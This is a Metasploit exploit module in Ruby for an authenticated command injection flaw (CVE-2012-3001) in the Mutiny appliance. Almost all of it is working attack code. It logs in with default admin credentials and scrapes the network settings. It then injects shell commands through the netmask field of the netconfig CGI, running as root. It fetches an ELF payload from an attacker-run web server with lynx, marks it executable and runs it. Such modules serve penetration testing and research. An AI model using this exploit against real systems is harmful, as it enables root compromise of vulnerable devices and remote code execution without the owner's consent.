# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Mutiny Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits an authenticated command injection vulnerability in the
        Mutiny appliance. Versions prior to 4.5-1.12 are vulnerable. In order to exploit
        the vulnerability the mutiny user must have access to the admin interface. The
        injected commands are executed with root privileges. This module has been tested
        successfully on Mutiny 4.2-1.05.
      },
      &#039;Author&#039;         =>
        [
          &#039;Christopher Campbell&#039;, # Vulnerability discovery
          &#039;juan vazquez&#039;          # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2012-3001&#039;],
          [&#039;OSVDB&#039;, &#039;86570&#039;],
          [&#039;BID&#039;, &#039;56165&#039;],
          [&#039;US-CERT-VU&#039;, &#039;841851&#039;],
          [&#039;URL&#039;, &#039;http://obscuresecurity.blogspot.com.es/2012/10/mutiny-command-injection-and-cve-2012.html&#039;]
        ],
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => [ &#039;unix&#039;, &#039;linux&#039; ],
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 4000
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Unix CMD&#039;,
            {
              &#039;Arch&#039; => ARCH_CMD,
              &#039;Platform&#039; => &#039;unix&#039;,
              #&#039;Payload&#039;        =>
              #  {
              #    &#039;Compat&#039;   =>
              #      {
              #        &#039;PayloadType&#039; => &#039;cmd&#039;,
              #        &#039;RequiredCmd&#039; => &#039;python&#039;
              #      }
              #  },
            }
          ],
          [ &#039;Linux Payload&#039;,
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;linux&#039;
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;Oct 22 2012&#039;,
      &#039;DefaultTarget&#039; => 1))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The base path to Mutiny&#039;, &#039;/interface/&#039; ]),
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;The user to authenticate as&#039;, &#039;admin&#039; ]),
        OptString.new(&#039;PASSWORD&#039;, [ true, &#039;The password to authenticate with&#039;, &#039;mutiny&#039; ])
      ], self.class)
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def lookup_lhost()
    # Get the source address
    if datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;
      Rex::Socket.source_address(&#039;50.50.50.50&#039;)
    else
      datastore[&#039;SRVHOST&#039;]
    end
  end

  def on_new_session(session)
    cmds = []
    cmds = [
      %Q|echo #{@netmask_eth0} > /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask|,
      %Q|tr -d "\\n\\r" < /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask > /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask.bak|,
      %Q|mv -f /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask.bak /opt/MUTINYJAVA/nemobjects/config/interface/eth0/0/netmask|,
      %Q|sed -e s/NETMASK=.*/NETMASK=#{@netmask_eth0}/ ifcfg-eth0 > ifcfg-eth0.bak|,
      %Q|mv -f ifcfg-eth0.bak ifcfg-eth0|,
      %Q|/etc/init.d/network restart|
    ] unless not @netmask_eth0
    cmds << %Q|rm /tmp/#{@elfname}.elf| unless target.name =~ /CMD/

    print_status("#{peer} - Restoring Network Information and Cleanup...")
    begin
      session.shell_command_token(cmds.join(" ; "))
    rescue
      print_error("#{peer} - Automatic restore and cleanup didn&#039;t work, please use these commands:")
      cmds.each { |cmd|
        print_warning(cmd)
      }
    end
    print_good("#{peer} - Restoring and Cleanup successful")
  end

  def start_web_service
    print_status("#{peer} - Setting up the Web Service...")

    if datastore[&#039;SSL&#039;]
      ssl_restore = true
      datastore[&#039;SSL&#039;] = false
    end

    resource_uri = &#039;/&#039; + @elfname + &#039;.elf&#039;
    service_url = "http://#{lookup_lhost}:#{datastore[&#039;SRVPORT&#039;]}#{resource_uri}"

    print_status("#{peer} - Starting up our web service on #{service_url} ...")
    start_service({&#039;Uri&#039; => {
      &#039;Proc&#039; => Proc.new { |cli, req|
        on_request_uri(cli, req)
      },
      &#039;Path&#039; => resource_uri
    }})
    datastore[&#039;SSL&#039;] = true if ssl_restore

    return service_url
  end

  # wait for the data to be sent
  def wait_linux_payload
    print_status("#{peer} - Waiting for the victim to request the ELF payload...")

    waited = 0
    while (not @elf_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore[&#039;HTTP_DELAY&#039;])
        fail_with(Exploit::Failure::Unknown, "Target didn&#039;t request request the ELF payload -- Maybe it cant connect back to us?")
      end
    end

    #print_status("#{peer} - Giving time to the payload to execute...")
    #select(nil, nil, nil, 20) unless session_created?

    print_status("#{peer} - Shutting down the web service...")
    stop_service
  end

  # Handle incoming requests from the target
  def on_request_uri(cli, request)
    vprint_status("#{peer} - on_request_uri called, #{request} requested")

    if (not @elf_data)
      print_error("#{peer} - A request came in, but the ELF archive wasn&#039;t ready yet!")
      return
    end

    print_good("#{peer} - Sending the ELF payload to the target...")
    @elf_sent = true
    send_response(cli, @elf_data)
  end

  def check
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;logon.jsp&#039;),
    })

    if res and res.body =~ /: Mutiny : Login @ mutiny/
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe
  end

  def exploit

    print_status("#{peer} - Login with the provided credentials...")

    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;logon.do&#039;),
      &#039;vars_post&#039; =>
      {
        &#039;username&#039; => datastore[&#039;USERNAME&#039;],
        &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
      }
    })

    if res and res.code == 302 and res.headers[&#039;Location&#039;] =~ /index.do/ and res.headers[&#039;Set-Cookie&#039;] =~ /JSESSIONID=(.*);/
      print_good("#{peer} - Login successful")
      session = $1
    else
      fail_with(Exploit::Failure::NoAccess, "#{peer} - Unable to login in Mutiny")
    end

    print_status("#{peer} - Leaking current Network Information...")

    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;cgi-bin&#039;, &#039;netconfig&#039;),
      &#039;cookie&#039;    => "JSESSIONID=#{session}",
    })

    if res and res.code == 200 and res.body =~ /Ethernet Interfaces/
      adress_eth0 = (res.body =~ /<input type="text" value="(.*)" name="addresseth0" class="textInput" \/>/ ? $1 : "")
      @netmask_eth0 = (res.body =~ /<input type="text" value="(.*)" name="netmasketh0" class="textInput" \/>/ ? $1 : "")
      gateway = (res.body =~ /<input type="text" name="Gateway" value= "(.*)" class="textInput">/ ? $1 : "")
      dns_address = (res.body =~ /<input type="text" value="(.*)" name="dnsaddress0" class="textInput">/ ? $1 : "")
      static_route_address = (res.body =~ /<input class="textInput" type="text" name="staticRouteAddress" value="(.*)" \/>/ ? $1 : "")
      static_route_netmask = (res.body =~ /<input class="textInput" type="text" name="staticRouteNetmask" value="(.*)" \/>/ ? $1 : "")
      static_route_gateway = (res.body =~ /<input class="textInput" type="text" name="staticRouteGateway" value="(.*)" \/>/ ? $1 : "")
      print_good("#{peer} - Information leaked successfully")
    else
      print_error("#{peer} - Error leaking information, trying to exploit with random values")
    end

    if target.name =~ /CMD/
      injection = @netmask_eth0.dup || rand_text_alpha(5 + rand(3))
      injection << "; #{payload.encoded}"
    else
      print_status("#{peer} - Generating the ELF Payload...")
      @elf_data = generate_payload_exe
      @elfname = Rex::Text.rand_text_alpha(3+rand(3))
      service_url = start_web_service
      injection = @netmask_eth0.dup || rand_text_alpha(5 + rand(3))
      injection << "; lynx -source \"#{service_url}\" > /tmp/#{@elfname}.elf"
      injection << "; chmod +x /tmp/#{@elfname}.elf"
      injection << "; /tmp/#{@elfname}.elf"

    end

    print_status("#{peer} - Exploiting Command Injection...")

    send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;cgi-bin&#039;, &#039;netconfig&#039;),
      &#039;cookie&#039;    => "JSESSIONID=#{session}",
      &#039;vars_post&#039; =>
      {
        "addresseth0" => adress_eth0 || rand_text_alpha(5 + rand(3)),
        "netmasketh0" => injection,
        "Gateway" => gateway || rand_text_alpha(5 + rand(3)),
        "dnsaddress0" => dns_address || rand_text_alpha(5 + rand(3)),
        "staticRouteAddress" => static_route_address || rand_text_alpha(5 + rand(3)),
        "staticRouteNetmask" => static_route_netmask || rand_text_alpha(5 + rand(3)),
        "staticRouteGateway" => static_route_gateway || rand_text_alpha(5 + rand(3))
      }
    }, 1)

    if target.name =~ /Linux Payload/
      wait_linux_payload
    end
  end



end

